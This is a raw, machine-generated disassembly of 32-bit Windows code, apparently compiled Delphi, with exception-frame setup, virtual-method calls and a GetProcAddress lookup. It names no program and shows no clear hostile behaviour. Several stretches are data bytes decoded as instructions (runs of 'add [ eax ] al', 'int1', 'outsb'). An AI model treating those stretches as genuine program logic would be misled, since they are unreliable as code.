mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_41fd4f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x24 ]
mov edx ebx
call sub_404e98
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd56
lea eax [ ebp - 0x8 ]
call sub_406af4
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_406b0c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_406b38
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_41f1f4
inc ecx
add [ edi - 0x6effbe0f ] al
int1
inc ecx
add [ ebp - 0xf ] ah
inc ecx
add [ ebp - 0xf ] ch
inc ecx
add [ ebp - 0xf ] dh
inc ecx
add bl dl
int1
inc ecx
add ch bl
int1
inc ecx
add bh ah
int1
inc ecx
add [ ebx - 0x54ffbe0f ] ah
int1
inc ecx
add [ ebx - 0x44ffbe0f ] dh
int1
inc ecx
add bl al
int1
inc ecx
add bl cl
int1
inc ecx
add [ ebx + 0x30041f1 ] bl
add [ eax ] al
add [ 0xa6b0cdb ] al
retn
sub_41f240
int1
sbb al 0xd1
xchg ebp eax
cmp [ esi - 0xe ] bl
int1
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x33 ] ch
lds ecx [ eax - 0x1e ]
jno r-xdata
movsd [ edi ] [ esi ]
leave
aam 0xa
inc ecx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
mov al [ 0xfffffffffb15f98e ]

cmp cl [ edx ]
inc ecx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
fdiv st2
inc ecx
add [ edx ] dh
inc ecx
in al dx
push ebx
mov ebx eax
test ebx ebx
je r-xdata
popad
outsb
popad
jb r-xdata
call sub_41f328
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
xor eax eax
mov [ ebx ] eax
add [ eax ] al
add [ eax ] al
add al bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
inc ecx
add [ eax ] dh
add [ eax ] al
add [ eax - 0x53ffbfef ] dh
inc ecx
inc eax
add [ ebx + ebp * 2 + 0x40 ] dh
add [ eax - 0x3fffbf95 ] al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x6b900040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] bh
add [ edx ] al
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bl
out dx eax
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax ] ah
add [ eax ] al
or al 0x54
dec eax
insb
jo r-xdata
xor dh dl
inc ecx
hlt
mov ecx r-xdata
call sub_406b38
cmp [ ebx ] 0x0
setne al
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_41f344
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
call sub_41f328
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
xor eax eax
mov [ ebx ] eax
mov ecx r-xdata
call sub_406b38
cmp [ ebx ] 0x0
setne al
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_41f38c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ee94
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ee94
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ee94
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404e44
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41f400
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_41f440
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_41f470
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41f602
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f59d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f609
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
mov eax esi
xor edx edx
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_41eed0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_41f610
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f6f5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f6fc
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_405af0
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_406b0c
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_406b38
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_406b0c
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_406b38
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_41f707
add [ edx ] ah
jpo r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f93c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
xor edi edi
test ebx ebx
je r-xdata
scasb [ edi ]
push ds
adc eax [ ebx - 0x46 ]
salc
cmp al 0x32
clc
div [ eax - 0x7b ]
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x24
mov edx ebx
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f943
lea eax [ ebp - 0x30 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
test edi edi
jne r-xdata
inc ebx
xor esi esi
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_405324
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x14 ] esi
inc edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x18 ] eax
xor edx edx
push ebp
push sub_41f917
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_41eed0
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
xor esi esi
xor edx edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_403f64
retn
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_41eed0
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x1c ]
call sub_403f64
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
sub_41f94c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f9c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_406b0c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_406b38
mov eax [ ebp - 0x8 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9c7
lea eax [ ebp - 0x8 ]
call sub_406af4
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
sub_41f9e0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fc59
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x24
mov edx [ ebp - 0x18 ]
call sub_404e98
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
inc ebx
xor esi esi
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0x1c ]
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41f94c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0xc ]
call sub_406b0c
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_406b38
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41f94c
pop ecx
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_406b38
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc60
lea eax [ ebp - 0x34 ]
call sub_406af4
lea eax [ ebp - 0x30 ]
call sub_404e44
lea eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_405af0
lea eax [ ebp - 0x10 ]
call sub_406af4
lea eax [ ebp - 0xc ]
call sub_406af4
retn
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41f94c
pop ecx
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_41fbf5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
inc ebx
xor esi esi
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41f94c
pop ecx
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
call sub_406b0c
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_406b38
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
inc esi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_41eed0
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x4 ]
call sub_406b0c
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_406b38
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_41fc8c
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_41fd4f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x24 ]
mov edx ebx
call sub_404e98
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd56
lea eax [ ebp - 0x8 ]
call sub_406af4
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_406b0c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_406b38
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_41fdcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_41fe76
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_41f9e0
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe7d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
call sub_41f440
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_41f470
jmp r-xdata
sub ax 0x5
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_41f9e0
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_41f610
sub_41fe88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ff72
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x12 ] 0x0
test ebx ebx
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x24
mov edx ebx
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff79
lea eax [ ebp - 0x8 ]
call sub_406af4
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
inc esi
xor edi edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
setg [ ebp - 0x13 ]
test bl bl
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp - 0x12 ] al
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
cmp [ ebp - 0x13 ] 0x0
je r-xdata
movzx edx [ ebp - 0x12 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov edx edi
call sub_41eed0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_406b0c
lea eax [ ebp - 0x8 ]
call sub_406af4
mov ecx eax
mov edx sub_41ff84
mov eax [ ebp - 0x4 ]
call sub_40f8cc
mov ebx eax
test bl bl
je r-xdata
sub_41ffac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41eed0
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41eed0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4166b4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41eed0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4166b4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4166b4
sub_420038
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_41f400
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp esi [ rw-data ]
jne r-xdata
lea eax [ esi + 0xc ]
call sub_406af4
mov eax [ esi + 0x18 ]
call sub_403f64
mov eax [ esi + 0x14 ]
call sub_403f64
mov eax [ esi + 0x10 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42009c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4200d3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4200da
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_4200dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_420199
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
movzx eax bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201a0
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
